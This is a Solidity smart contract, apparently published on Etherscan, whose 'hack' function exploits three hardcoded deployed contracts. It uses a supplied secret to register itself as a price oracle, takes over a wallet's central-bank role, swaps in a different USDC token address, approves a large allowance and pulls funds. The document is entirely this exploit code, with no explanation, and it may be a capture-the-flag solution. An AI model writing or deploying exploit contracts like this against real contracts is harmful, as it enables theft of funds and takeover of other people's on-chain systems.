/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface CBDC {
  function addOracle(string calldata _secret) external;
  function updatePrice(bytes32 _blockHash, uint256 _usdPrice) external;
}

interface MultiWallet {
    function buyFundsPublic() external;
    function updateCentralBank(address _newBank) external;
    function upgradeUSDC(address _usdc) external;
}

interface IERC20 {
    function transfer(address receiver, uint numTokens) external returns (bool);
    function approve(address delegate, uint numTokens) external returns (bool);
}

contract PriceUpdater {
    address cbdc = 0x094251c982cb00B1b1E1707D61553E304289D4D8;
    address usdc = 0x5bbEC9919cC3B69DadA29edE630e591e00934FB7;
    address wallet = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA;
    function updatePrice(string calldata _secret) public {    
        CBDC(cbdc).addOracle(_secret);
        uint256 blockNumber = block.number - 1;
        bytes32 blockHash = blockhash(blockNumber);
        uint256 price = 206;
        CBDC(cbdc).updatePrice(blockHash, price);
    }

    function hack(string calldata _secret) public {    
        CBDC(cbdc).addOracle(_secret);
        MultiWallet(wallet).updateCentralBank(address(this));
        MultiWallet(wallet).upgradeUSDC(usdc);
        IERC20(usdc).approve(wallet, 100000000000000);
        MultiWallet(wallet).buyFundsPublic();
        IERC20(cbdc).transfer(msg.sender,1);
    }
}